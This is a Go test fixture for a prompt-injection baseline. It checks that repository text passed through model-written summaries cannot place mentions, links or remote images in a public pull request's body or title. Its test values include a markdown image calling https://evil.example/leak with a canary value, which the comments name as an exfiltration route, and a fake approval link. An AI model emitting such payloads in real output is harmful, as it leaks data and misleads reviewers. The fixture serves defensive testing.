package runner

// Injection baseline fixture (risk-remediation task 1.1, requirement 5):
// repository text that reaches a public pull request.
//
// The fixture is EXPECTED TO FAIL on the current code (finding F9 in
// .kiro/specs/risk-remediation/phase0-findings.md), so it is skipped unless
// MAGI_INJECTION_BASELINE=1. The default run (tools/check.sh) skips it.
//
//	MAGI_INJECTION_BASELINE=1 go test -count=1 -run 'TestInjection' -v ./runner/
//
// The other injection fixtures are in ../compose/injection_baseline_test.go.

import (
	"os"
	"strings"
	"testing"
)

// Sink: the body and title of a public pull request (prBody, prTitle). The
// instructions and the summary come from model-written text that can hold
// text of a repository. A mention, a remote image (an exfiltration route),
// or a link must not reach the body as it is.
func TestInjectionPullRequestBody(t *testing.T) {
	if os.Getenv("MAGI_INJECTION_BASELINE") != "1" {
		t.Skip("injection baseline fixture (expected to fail until tasks 1.2-1.4); set MAGI_INJECTION_BASELINE=1 to run")
	}
	const canary = "MAGI-CANARY-7f3a"
	vars := map[string]string{
		"title":              "Fix typo @everyone " + canary,
		"instructions":       "Fix the typo. cc @org/security-team\n![x](https://evil.example/leak?d=" + canary + ")",
		"apprentice.summary": "Done. [click to approve](https://evil.example/approve?" + canary + ")",
	}
	body := prBody(vars, "run_1", "0123456789abcdef")
	title := prTitle(vars)
	for _, bad := range []string{"![x](https://evil.example", "@org/security-team", "](https://evil.example/approve"} {
		if strings.Contains(body, bad) {
			t.Errorf("SINK REACHED pull-request body with attack text %q:\n%s", bad, body)
		}
	}
	if strings.Contains(title, "@everyone") {
		t.Errorf("SINK REACHED pull-request title with a mention: %q", title)
	}
}
